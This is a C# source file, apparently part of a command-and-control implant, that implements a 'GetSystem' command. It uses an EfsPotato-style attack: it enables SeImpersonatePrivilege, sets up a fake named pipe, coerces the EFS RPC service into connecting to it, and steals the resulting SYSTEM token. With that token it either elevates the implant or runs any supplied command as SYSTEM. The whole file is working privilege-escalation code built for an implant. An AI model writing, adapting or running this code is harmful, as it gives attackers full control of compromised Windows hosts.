using DynamicEngLoading;
using Microsoft.Win32.SafeHandles;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using static DynamicEngLoading.h_DynInv.Win32;
using static DynamicEngLoading.h_DynInv.Win32.ProcessThreadsAPI;
using static DynamicEngLoading.h_DynInv.Win32.WinNT;
using static DynamicEngLoading.h_DynInv_Methods;

namespace Engineer.Commands
{
    internal class GetSystem : EngineerCommand
    {
        public override string Name => "GetSystem";

        public override async Task Execute(EngineerTask task)
        {
            try
            {
                //goal here is to use efs potato to elevate the current implant into a system level process
                string pipe = "lsarpc";
                _LUID_AND_ATTRIBUTES[] l = new _LUID_AND_ATTRIBUTES[1];
                using (WindowsIdentity wi = WindowsIdentity.GetCurrent())
                {
                    Console.WriteLine("[*] Current user: " + wi.Name);
                    AdvApi32FuncWrapper.LookupPrivilegeValue(null, "SeImpersonatePrivilege", out l[0].Luid);
                    _TOKEN_PRIVILEGES tp = new _TOKEN_PRIVILEGES();
                    tp.PrivilegeCount = 1;
                    tp.Privileges = l;
                    l[0].Attributes = 2;
                    if (!AdvApi32FuncWrapper.AdjustTokenPrivileges(wi.Token, false, ref tp, Marshal.SizeOf(tp), IntPtr.Zero, IntPtr.Zero) || Marshal.GetLastWin32Error() != 0)
                    {
                        Console.WriteLine("[-] SeImpersonatePrivilege not held.");
                        ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("SeImpersonatePrivilege not held", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
                        return;
                    }
                }
                Console.WriteLine("[+] SeImpersonatePrivilege held.");
                string g = Guid.NewGuid().ToString("d");
                string fake = @"\\.\pipe\" + g + @"\pipe\srvsvc";
                Console.WriteLine("[*] Creating pipe: " + fake);
                var hPipe = Ker32FuncWrapper.CreateNamedPipe(fake, Kernel32.PipeOpenModeFlags.PIPE_ACCESS_DUPLEX, Kernel32.PipeModeFlags.PIPE_TYPE_BYTE, 10, 2048, 2048, 0, IntPtr.Zero);
                if (hPipe == new IntPtr(-1))
                {
                    Console.WriteLine("[-] can not create pipe: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("can not create pipe: " + new Win32Exception(Marshal.GetLastWin32Error()).Message, task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
                    return;
                }
                ManualResetEvent mre = new ManualResetEvent(false);
                //allows the thread to take in parameters matching the thread start delegate
                var tn = new Thread(NamedPipeThread);
                tn.IsBackground = true;
                Console.WriteLine("[*] Starting named pipe thread");
                tn.Start(new object[] { hPipe, mre });
                var tn2 = new Thread(RpcThread);
                tn2.IsBackground = true;
                Console.WriteLine("[*] Starting RPC thread");
                tn2.Start(new object[] { g, pipe });
                if (mre.WaitOne(3000))
                {
                    if (AdvApi32FuncWrapper.ImpersonateNamedPipeClient(hPipe))
                    {
                        IntPtr tkn = WindowsIdentity.GetCurrent().Token;
                        Console.WriteLine("[+] Got Token: " + tkn);
                        WinBase._SECURITY_ATTRIBUTES sa = new WinBase._SECURITY_ATTRIBUTES();
                        sa.nLength = Marshal.SizeOf(sa);
                        sa.lpSecurityDescriptor = IntPtr.Zero;
                        sa.bInheritHandle = true;
                        IntPtr hRead, hWrite;
                        Ker32FuncWrapper.CreatePipe(out hRead, out hWrite, ref sa, 1024);

                        // get SYSTEM for the current process using token impersonation
                        if (task.Arguments.ContainsKey("/elevate"))
                        {
                            if (!AdvApi32FuncWrapper.ImpersonateLoggedOnUser(tkn))
                            {
                                Console.WriteLine("[-] Could not ImpersonateLoggedOnUser. Error: " + Marshal.GetLastWin32Error());
                                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("[-] Could not ImpersonateLoggedOnUser. Error: " + Marshal.GetLastWin32Error(), task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
                            }
                            else
                            {
                                var identity = new WindowsIdentity(tkn);
                                Program.ImpersonatedUser = identity;
                                Program.ImpersonatedUserChanged = true;
                                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("[+] ImpersonateLoggedOnUser successful! Current user: " + identity.Name, task, EngTaskStatus.Complete, TaskResponseType.String);
                            }
                        }
                        // Run a command as SYSTEM instead
                        else if (task.Arguments.TryGetValue("/command", out string command))
                        {
                            _PROCESS_INFORMATION pi = new _PROCESS_INFORMATION();
                            _STARTUPINFO si = new _STARTUPINFO();
                            si.cb = Marshal.SizeOf(si);
                            si.hStdError = hWrite;
                            si.hStdOutput = hWrite;
                            si.lpDesktop = "WinSta0\\Default";
                            si.dwFlags = 0x101;
                            si.wShowWindow = 0;
                            if (AdvApi32FuncWrapper.CreateProcessAsUser(tkn, null, command, IntPtr.Zero, IntPtr.Zero, true, 0x08000000, IntPtr.Zero, IntPtr.Zero, ref si, out pi))
                            {
                                Console.WriteLine($"[+] process with pid: {pi.dwProcessId} created.\r\n==============================");
                                tn = new Thread(ReadThread);
                                tn.IsBackground = true;
                                tn.Start(hRead);
                                new ProcessWaitHandle(new SafeWaitHandle(pi.hProcess, false)).WaitOne(-1);
                                tn.Abort();
                                Ker32FuncWrapper.CloseHandle(pi.hProcess);
                                Ker32FuncWrapper.CloseHandle(pi.hThread);
                                Ker32FuncWrapper.CloseHandle(tkn);
                                Ker32FuncWrapper.CloseHandle(hWrite);
                                Ker32FuncWrapper.CloseHandle(hRead);
                                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"Command {command} executed as system", task, EngTaskStatus.Complete, TaskResponseType.String);
                            }
                        }
                    }
                    else
                    {
                        Console.WriteLine("[-] ImpersonateNamedPipeClient failed. Error: " + Marshal.GetLastWin32Error());
                        ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("[-] ImpersonateNamedPipeClient failed. Error: " + Marshal.GetLastWin32Error(), task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
                    }
                }
                else
                {
                    Console.WriteLine("[-] Error! Operation timed out");
                    Ker32FuncWrapper.CreateFile(fake, Kernel32.EFileAccess.GenericAll, 0, IntPtr.Zero, Kernel32.ECreationDisposition.OpenExisting, Kernel32.EFileAttributes.Normal, IntPtr.Zero);//force cancel async operation
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("[-] Error! Operation timed out", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
                }
                Ker32FuncWrapper.CloseHandle(hPipe);
                return;

            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(ex.ToString(), task, EngTaskStatus.Failed, TaskResponseType.String);
            }
        }

        static void ReadThread(object o)
        {
            IntPtr p = (IntPtr)o;
            FileStream fs = new FileStream(p, FileAccess.Read, false);
            StreamReader sr = new StreamReader(fs, Console.OutputEncoding);
            while (true)
            {
                string s = sr.ReadLine();
                if (s == null) { break; }
                Console.WriteLine(s);
            }
        }
        static void RpcThread(object o)
        {
            object[] objs = o as object[];
            string g = objs[0] as string;
            string p = objs[1] as string;
            EfsrTiny r = new EfsrTiny(p);
            try
            {
                r.EfsRpcEncryptFileSrv("\\\\localhost/PIPE/" + g + "/\\" + g + "\\" + g);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }

        static void NamedPipeThread(object o)
        {
            try
            {
                object[] objs = o as object[];
                IntPtr pipe = (IntPtr)objs[0];
                ManualResetEvent mre = objs[1] as ManualResetEvent;
                if (mre != null)
                {
                    Ker32FuncWrapper.ConnectNamedPipe(pipe, IntPtr.Zero);
                    mre.Set();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }

        }

    }
}
